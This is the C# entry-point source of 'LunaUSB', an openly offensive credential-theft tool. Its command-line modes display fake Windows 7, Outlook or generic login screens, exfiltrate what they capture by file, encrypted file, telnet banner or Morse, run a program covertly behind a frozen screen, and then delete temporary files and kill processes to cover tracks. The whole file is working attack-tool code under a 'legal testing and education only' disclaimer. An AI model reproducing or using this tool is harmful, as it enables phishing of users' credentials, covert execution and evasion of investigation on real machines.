//Copyright(C) 2016  saintcrossbow@gmail.com

//This program is free software: you can redistribute it and/or modify
//it under the terms of the GNU General Public License as published by
//the Free Software Foundation, either version 3 of the License, or
//(at your option) any later version.

//This program is distributed in the hope that it will be useful,
//but WITHOUT ANY WARRANTY; without even the implied warranty of
//MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
//GNU General Public License for more details.

//You should have received a copy of the GNU General Public License
//along with this program.If not, see<http://www.gnu.org/licenses/>

using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;

namespace Luna
{
    enum startMethodType
    {
        startMission = 1,
        startHelp = 2,
        startSetup = 3,
        startDecrypt = 4,
        startCovertRun = 5
    }

    static class Program
    {
        [DllImport("kernel32.dll")]
        static extern bool AttachConsole(int dwProcessId);
        private const int ATTACH_PARENT_PROCESS = -1;

        // Main Entry point
        [STAThread]
        static void Main(string[] args)
        {
            startMethodType startMethod = startMethodType.startMission;

            // Determine method of start
            if (args.Length == 0 || LunaGeneral.hasSwitch(args, "setup") == " ")
            {
                // Specified either nothing or has explicitly said setup
                startMethod = startMethodType.startSetup;
            }
            else if (LunaGeneral.hasSwitch(args, "help") == " " || LunaGeneral.hasSwitch(args, "?") == " ")
            {
                // Specified either nothing or has explicitly said setup
                startMethod = startMethodType.startHelp;
            }
            else if (LunaGeneral.hasSwitch(args, "decrypt") != "")
            {
                // Specified file to decrypt
                startMethod = startMethodType.startDecrypt;
            }
            else if (LunaGeneral.hasSwitch(args, "covert") != "")
            {
                // Specified program to run in freeze mode
                startMethod = startMethodType.startCovertRun;
            }

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            switch (startMethod)
            {
                case startMethodType.startMission:
                {
                    // Start the mission
                    string curtainStyle = LunaGeneral.hasSwitch(args, "curtain");
                    string exfilMethod = LunaGeneral.hasSwitch(args, "exfil");

                    startMission(curtainStyle, exfilMethod, args);                    
                    break;
                }
                case startMethodType.startHelp:
                {
                    ShowCheatsheet();
                    break;
                }

                case startMethodType.startDecrypt:
                {
                    // Decrypt file
                    string target = LunaGeneral.hasSwitch(args, "decrypt");
                    string password = LunaGeneral.hasSwitch(args, "password");
                    decryptToConsole(target, password);
                    break;
                }

                case startMethodType.startCovertRun:
                {
                    // Not exfiltrating but running a command in background
                    string target = LunaGeneral.hasSwitch(args, "covert");
                    missionRun startCurtain = new missionRun(Common.CurtainStyle.FreezeScreen, Common.ExfiltrationMethod.Undefined, target, "");
                    runProgram(startCurtain);
                    break;
                }
                case startMethodType.startSetup:
                default:
                {
                    // Splash screen
                    splash splashScreen = new splash();
                    splashScreen.Show();
                    System.Threading.Thread.Sleep(2000);
                    splashScreen.Visible = false;
                    splashScreen = null;
                    // Setup screen
                    Application.Run(new Main());
                    break;
                }
            }
        }

        static void ShowCheatsheet()
        {
            StringBuilder cheatSheet = new StringBuilder();
            cheatSheet.Append(String.Format("\r\nLunaUSB Version {0}, Copyright (C) 2016 saintcrossbow@gmail.com", Application.ProductVersion));
            // http://www.drdobbs.com/jvm/creating-an-open-source-project/240145389
            cheatSheet.Append("\r\nLunaUSB comes with ABSOLUTELY NO WARRANTY. This is free software and you are");
            cheatSheet.Append("\r\nwelcome to redistribute it. See Luna\\Docs\\gpl.txt. ");
            cheatSheet.Append("\r\nLegal testing, demonstration, and education usage only.");
            cheatSheet.Append("\r\n----------------------------------------------------------------------------");
            cheatSheet.Append("\r\nStandard Usage");
            cheatSheet.Append("\r\n/help            This cheatsheet of command parameters");
            cheatSheet.Append("\r\n/setup           Start the mission parameters screen; also starts if no ");
            cheatSheet.Append("\r\n                 arguments specified");
            cheatSheet.Append("\r\n/curtain [n]     Specify the curtain to use on mission start");
            cheatSheet.Append("\r\n                 1=Modern Win7, 2=Email Prompt, 3=Generic");
            cheatSheet.Append("\r\n/exfil [n]       Specify the exfiltration method");
            cheatSheet.Append("\r\n                 1=Plaintext, 2=Encrypted Text, 3=Telnet Banner, 4=Morse");
            cheatSheet.Append("\r\n/output [s]      Full path and filename to output discovered info");
            cheatSheet.Append("\r\n/password [s]    Password for output file");
            cheatSheet.Append("\r\n----------------------------------------------------------------------------");
            cheatSheet.Append("\r\nDecrypt Exfiltrated File");
            cheatSheet.Append("\r\n/input [s]       Full path to the captured file");
            cheatSheet.Append("\r\n/password [s]    Password for output file");
            cheatSheet.Append("\r\n----------------------------------------------------------------------------");
            cheatSheet.Append("\r\nCovert Execution");
            cheatSheet.Append("\r\n/covert [s]      Freeze screen and run program at [s]");
            cheatSheet.Append("\r\n\r\n");

            // Writing to console from Windows app
            // http://www.csharp411.com/console-output-from-winforms-application/
            AttachConsole(ATTACH_PARENT_PROCESS);
            Console.Clear();
            Console.WriteLine(cheatSheet);
            Application.Exit();
        }

        // Show a single-line message to the console
        static void showConsole(string errorText)
        {
            StringBuilder errDisplay = new StringBuilder();
            errDisplay.Append(String.Format("\r\nLuna Version {0}", Application.ProductVersion));
            errorText = "\r\n" + errorText + "\r\n";
            errDisplay.Append(errorText);
            AttachConsole(ATTACH_PARENT_PROCESS);
            Console.Clear();
            Console.WriteLine(errDisplay);
        }

        // Decrypt the exfiltrated text and send to console
        static void decryptToConsole(string inputFile, string password)
        {
            string result = "";

            try
            {
                if (File.Exists(inputFile))
                {
                    result = Crypto.DecryptFile(inputFile, password);
                    showConsole("Exfiltrated data: " + result);
                }
                else
                {
                    showConsole("The input file was not found.");
                    Application.Exit();
                }                         
            }
            catch (Exception ex)
            {
                showConsole("Error decrypting the file: " + ex.Message);
            }
        }

        // Start curtain and exfiltration    
        static void startMission(string curtain, string exfilMethod, string[] args)
        {
            Luna.Common.CurtainStyle curtainStyle = Common.CurtainStyle.Undefined;
            Luna.Common.ExfiltrationMethod exfiltrateMethod = Common.ExfiltrationMethod.Undefined;
            string errorText = "";
            string targetFile = null;
            string encryptKey = null;

            // Curtain screen
            switch (curtain)
            {
                case " ":
                case "":
                    errorText = "No curtain specified.";
                    break;
                case "1":
                    curtainStyle = Common.CurtainStyle.Win7;
                    break;
                case "2":
                    curtainStyle = Common.CurtainStyle.OutlookPrompt;
                    break;
                case "3":
                    curtainStyle = Common.CurtainStyle.GenericLogin;
                    break;
                default:
                    errorText = "Invalid curtain specified.";
                    break;
            }

            // Exfiltration screen
            string fileVal = LunaGeneral.hasSwitch(args, "output");
            string keyVal = LunaGeneral.hasSwitch(args, "password");            
            switch (exfilMethod)
            {                        
                case " ":
                case "":
                    errorText = "No exfiltration method specified.";
                    break;
                case "1":
                    if (!String.IsNullOrWhiteSpace(fileVal))
                    {
                        targetFile = fileVal;
                        exfiltrateMethod = Common.ExfiltrationMethod.PlainTextFile;
                    }
                    else
                        errorText = "An output file is required for this exfiltration method.";
                    break;
                case "2":
                    if (!String.IsNullOrWhiteSpace(fileVal) &&
                        !String.IsNullOrWhiteSpace(keyVal))
                    {
                        targetFile = fileVal;
                        encryptKey = keyVal;
                        exfiltrateMethod = Common.ExfiltrationMethod.EncryptedFile;
                    }
                    else
                        errorText = "An output file and password is required for this exfiltration method.";                            
                    break;
                case "3":
                    exfiltrateMethod = Common.ExfiltrationMethod.TelnetBanner;
                    break;
                case "4":
                    exfiltrateMethod = Common.ExfiltrationMethod.Morse;
                    break;
                default:
                    errorText = "Invalid exfiltration method specified.";
                    break;
            }
                    
            // Run the mission if all is specified correctly; otherwise show the error in the console
            if (errorText == "")
            {
                missionRun startCurtain = new missionRun(curtainStyle, exfiltrateMethod, targetFile, encryptKey);
                runProgram(startCurtain);
            }
            else
            {
                showConsole(errorText);
                Application.Exit();
            }
        }

        static void runProgram(missionRun startCurtain)
        {
            Application.Run(startCurtain);
            startCurtain.Dispose();
            // Remove temporary files afterwards

            CoverTracks.Instance.ClearAllFiles();
            // ... as well as any running processes
            CoverTracks.Instance.ClearAllProcesses();
        }

    }
}
